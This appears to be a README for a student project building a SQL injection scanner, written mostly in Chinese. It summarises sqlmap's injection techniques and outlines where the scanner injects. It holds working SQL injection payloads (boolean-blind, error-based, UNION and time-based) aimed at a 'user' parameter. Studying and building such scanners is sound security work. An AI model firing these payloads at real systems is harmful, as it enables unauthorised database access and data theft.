# Web-Vulnerability-Scanner
Web Vulnerability Scanner: SQL
### 目的：熟悉SQL漏洞等常见Web漏洞原理，重点不在效率和使用，如果正八经儿检测，sqlmapapi甚至是各种工具就方便快捷
## 实现功能
1. 针对SQL注入漏洞、SQL盲注
2. 通过匹配报错出来的信息，可以正则判断出所用的数据库

## SQL注入总结（根据sqlmap）
## 注入方式
## 1. B: Boolean-based blind SQL injection（布尔型注入）<br>
### `Title: AND boolean-based blind - WHERE or HAVING clause`<br>
### `Payload: user=user1' AND 4676=4676 AND 'ZzOn'='ZzOn`
## 2. E: Error-based SQL injection（报错型注入）<br>
###  ` Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)`<br>
###  `Payload: user=user1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b786b71,(SELECT (ELT(7994=7994,1))),0x717a787871,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'XSuv'='XSuv`
## 3. U: UNION query SQL injection（可联合查询注入）<br>
###  `Title: Generic UNION query (NULL) - 2 columns`<br>
###  `Payload: user=user1' UNION ALL SELECT CONCAT(0x716b786b71,0x6a6a6668724d514d5448686874774f486d634550735659727866554e65554e4e4f55504146706471,0x717a787871),NULL-- QvWZ`
## 4. S: Stacked queries SQL injection（可多语句查询注入）
## 5. T: Time-based blind SQL injection（基于时间延迟注入）<br>
###  `Title: MySQL >= 5.0.12 AND time-based blind`<br>
###  `Payload: user=user1' AND SLEEP(5) AND 'EJXX'='EJXX`
## 6. Q: inline_query(内联查询)


    
## SQL漏洞扫描代码实现
## ![avatar](/1.png)
## ![avatar](/2.png)
### 1. 判断注入位置：
  - 判断GET,POST方法
  - HTTP报文的头部字段——>设置Cookie、User-Agent、Referer
### 2. 前缀PREFIXES
### 2. 后缀SUFFIXES
### 3. 参数 
